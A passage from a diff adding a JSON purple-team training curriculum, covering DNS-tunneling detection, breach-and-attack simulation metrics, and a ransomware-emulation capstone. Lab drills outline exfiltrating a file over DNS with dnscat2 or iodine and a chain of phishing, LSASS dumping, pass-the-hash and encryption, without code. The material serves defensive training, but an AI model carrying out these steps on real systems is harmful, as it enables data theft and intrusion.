+              "Sigma: dns_query_win_long_domain \u2014 Sysmon Event 22 with unusually long domain names",
+              "DLP: monitor DNS traffic volume per host (hosts sending 100x normal DNS volume are suspicious)"
+            ],
+            "tools": [
+              "Zeek (dns.log)",
+              "RITA (DNS tunneling analysis)",
+              "Suricata (DNS tunneling rules)",
+              "Splunk/Elastic SIEM",
+              "Windows DNS analytic logging"
+            ],
+            "controls": [
+              "DNS filtering (block known tunneling domains)",
+              "Firewall: restrict DNS to approved recursive resolvers only",
+              "Monitor DNS query entropy and volume",
+              "Block DNS to non-standard ports",
+              "Response Policy Zones (RPZ) for DNS firewalling"
+            ]
+          },
+          "gap_analysis": "DNS tunneling is hard to detect because DNS is essential and always allowed. Entropy-based detection catches obvious tunneling but sophisticated attackers use dictionary encoding (mapping data to dictionary words) to reduce entropy. Gap: many orgs dont collect Zeek DNS logs or analyze DNS query patterns at all. DNS-over-HTTPS (DoH) further obscures DNS queries from network monitoring.",
+          "drills": [
+            "Set up dnscat2 DNS tunnel in lab. Exfiltrate a file via DNS. Analyze Zeek dns.log \u2014 what patterns are visible? Run RITA and verify it detects the tunneling. Then try iodine with dictionary encoding \u2014 does entropy-based detection still work? Write custom detection rules."
+          ],
+          "common_mistakes": [
+            "Not collecting or analyzing DNS logs at all",
+            "Allowing DNS to any resolver (not restricting to approved recursive resolvers)",
+            "Only looking at DNS query volume not entropy or query content patterns"
+          ]
+        },
+        {
+          "id": "bas-and-metrics",
+          "title": "Breach & Attack Simulation (BAS) & Purple Team Metrics \u2014 MTTD, MTTR & Coverage",
+          "concepts": [
+            "BAS (Breach and Attack Simulation): automated platforms that continuously run simulated attacks to validate security controls",
+            "Commercial BAS platforms: SafeBreach AttackIQ Cymulate Picus \u2014 automated ATT&CK-based simulation",
+            "Open-source BAS: Atomic Red Team CALDERA Prelude \u2014 manual or semi-automated simulation",
+            "MTTD (Mean Time to Detect): average time from attacker action to detection by the SOC",
+            "MTTR (Mean Time to Respond/Resolve): average time from detection to containment/remediation",
+            "Detection coverage percentage: percentage of relevant ATT&CK techniques with working detections"
+          ],
+          "key_facts": [
+            "SafeBreach simulates attacks across the kill chain and validates prevention/detection at each layer",
+            "AttackIQ was a founding partner of MITRE ATT&CK and has deep ATT&CK integration",
+            "Industry average MTTD is ~200 days; top-performing SOCs achieve <24 hours",
+            "Industry average MTTR is ~70 days; top-performing SOCs achieve <24 hours",
+            "Detection coverage should be measured per ATT&CK tactic: aim for >70% coverage on Initial Access Execution and Credential Access"
+          ],
+          "attack_side": {
+            "technique": "Run continuous automated attack simulations to measure detection coverage gaps and validate existing controls",
+            "attack_steps": [
+              "Configure BAS platform (e.g., SafeBreach) with ATT&CK technique library",
+              "Run simulation campaigns across all ATT&CK tactics",
+              "For each technique: record whether it was prevented detected or missed",
+              "Generate coverage heatmap showing gaps by ATT&CK tactic",
+              "Prioritize remediation: build new detections for the highest-risk gaps"
+            ],
+            "tools": [
+              "SafeBreach",
+              "AttackIQ",
+              "Cymulate",
+              "Picus",
+              "Atomic Red Team",
+              "CALDERA"
+            ],
+            "attack_techniques": [
+              "T1566",
+              "T1059.001",
+              "T1003.001",
+              "T1055",
+              "T1550.002",
+              "T1041"
+            ],
+            "killchain_stage": "reconnaissance"
+          },
+          "defense_side": {
+            "what_to_detect": "Track detection coverage MTTD MTTR false positive rate and control effectiveness as ongoing KPIs",
+            "logs": [
+              "All SIEM alerts correlated with BAS simulation timestamps",
+              "EDR detection logs",
+              "SOAR (Security Orchestration) response time tracking"
+            ],
+            "detection_rules": [
+              "BAS platform reporting: per-technique prevention/detection/miss results",
+              "SIEM metrics dashboard: MTTD = avg(time_alert - time_attack) across simulations",
+              "Coverage heatmap: percentage of ATT&CK techniques with at least one working detection",
+              "False positive rate: (false_alerts / total_alerts) per detection rule"
+            ],
+            "tools": [
+              "SafeBreach/AttackIQ (BAS platform)",
+              "VECTR (exercise tracking + heatmap)",
+              "Splunk/Elastic (metrics dashboards)",
+              "SOAR platforms (response automation)",
+              "DeTTECT (coverage mapping)"
+            ],
+            "controls": [
+              "Continuous BAS testing",
+              "ATT&CK coverage monitoring",
+              "MTTD/MTTR SLA tracking",
+              "Detection lifecycle management",
+              "Tabletop exercise programs"
+            ]
+          },
+          "gap_analysis": "BAS platforms test individual techniques but may not test full attack chains. MTTD/MTTR metrics can be gamed if detection/alerting thresholds are too loose (low MTTD but high false positives). Gap: many orgs measure detection coverage but dont measure response effectiveness (MTTR) or false positive impact on SOC analysts.",
+          "drills": [
+            "Full capstone: Run a complete purple team exercise. Deploy CALDERA with an adversary profile (e.g., APT29 emulation). Execute the full attack chain. Measure: (1) detection coverage by tactic (2) MTTD per technique (3) MTTR for detected techniques. Generate a VECTR report and ATT&CK Navigator heatmap. Identify top 5 gaps and build new detections."
+          ],
+          "common_mistakes": [
+            "Running BAS once and not continuously \u2014 controls degrade over time",
+            "Only measuring detection coverage and not MTTD/MTTR (speed matters as much as coverage)",
+            "Not tracking false positive rate alongside coverage (100% coverage with 90% false positives is useless)",
+            "Focusing on technique count rather than risk-prioritized coverage"
+          ]
+        },
+        {
+          "id": "tabletop-cyber-range-capstone",
+          "title": "Tabletop Exercises & Cyber Range Scenarios \u2014 The Unicorn Capstone",
+          "concepts": [
+            "Tabletop exercises: discussion-based scenarios where teams walk through incident response procedures without technical execution",
+            "Cyber range exercises: hands-on scenarios in isolated environments where red and blue teams execute in real-time",
+            "Hybrid exercises: combine tabletop discussion with live technical execution (purple team format)",
+            "CISA Tabletop Exercise Packages (CTEP): free customizable exercise templates with scenarios and injects",
+            "Scenario design: map exercise objectives to ATT&CK techniques and organizational risk"
+          ],
+          "key_facts": [
+            "CISA provides free tabletop exercise packages for ransomware phishing and supply chain scenarios",
+            "HTB (Hack The Box) Detection and OpSec Cyber Range provides purple team lab environments",
+            "Purple team exercises should be run quarterly minimum \u2014 continuous improvement cycle",
+            "Scenario realism: use threat intelligence to model exercises after real adversary behaviors"
+          ],
+          "attack_side": {
+            "technique": "Execute a full adversary emulation scenario in a cyber range simulating a real threat actor campaign",
+            "attack_steps": [
+              "Select threat actor to emulate (e.g., APT29 FIN7 LockBit)",
+              "Map adversary TTPs to ATT&CK techniques from threat intelligence reports",
+              "Build emulation plan: chain techniques from Initial Access through Exfiltration",
+              "Execute scenario in cyber range with red team running attacks and blue team detecting",
+              "Debrief: both sides discuss what worked what didnt and what to improve"
+            ],
+            "tools": [
+              "Cobalt Strike",
+              "Atomic Red Team",
+              "CALDERA",
+              "HTB Cyber Range",
+              "Cloud Range",
+              "Custom scenario scripts"
+            ],
+            "attack_techniques": [
+              "T1566.001",
+              "T1059.001",
+              "T1003.001",
+              "T1055",
+              "T1550.002",
+              "T1071.001",
+              "T1041"
+            ],
+            "killchain_stage": "initial-access"
+          },
+          "defense_side": {
+            "what_to_detect": "Measure end-to-end detection coverage across the full attack chain and identify where the chain breaks",
+            "logs": [
+              "All log sources active during the exercise (Sysmon Windows Security Zeek EDR SIEM)",
+              "SOAR playbook execution logs",
+              "Incident response timeline correlated with attack timestamps"
+            ],
+            "detection_rules": [
+              "Full detection suite tested against the emulation scenario",
+              "Correlation rules linking multiple techniques into attack chain alerts"
+            ],
+            "tools": [
+              "VECTR (exercise tracking)",
+              "Splunk/Elastic (correlation)",
+              "Velociraptor (DFIR)",
+              "Kansa (PowerShell IR)",
+              "SOAR (response automation)"
+            ],
+            "controls": [
+              "Full detection stack (SIEM + EDR + Sysmon + Zeek)",
+              "Incident response playbooks",
+              "SOAR automated response",
+              "Threat hunting program",
+              "Post-exercise improvement process"
+            ]
+          },
+          "gap_analysis": "The capstone exercise reveals where detection coverage breaks across the kill chain. Common finding: detections exist for individual techniques but no correlation rule links them into an attack chain alert. Gap: many orgs detect individual techniques but miss the broader campaign narrative. Purple team exercises build these correlation detections.",
+          "drills": [
+            "ULTIMATE CAPSTONE: Run a 2-day purple team exercise emulating a ransomware operator (e.g., LockBit). Day 1: Red team executes full attack chain (phishing to PowerShell to LSASS dump to PtH to data exfil to encryption). Blue team attempts detection and response in real-time. Track every technique in VECTR. Day 2: Joint debrief identifying gaps. Build new detections and correlation rules. Re-run the scenario to validate improvements. Final metrics: detection coverage MTTD MTTR and attack chain correlation."
+          ],
+          "common_mistakes": [
+            "Running exercises without clear objectives or success criteria",
+            "Not involving both teams in the debrief and improvement process",
+            "Failing to follow up on identified gaps with actual detection improvements",
+            "Using unrealistic scenarios that dont match organizational threat landscape"
+          ]
+        }
+      ]
+    }
+  ]
+}
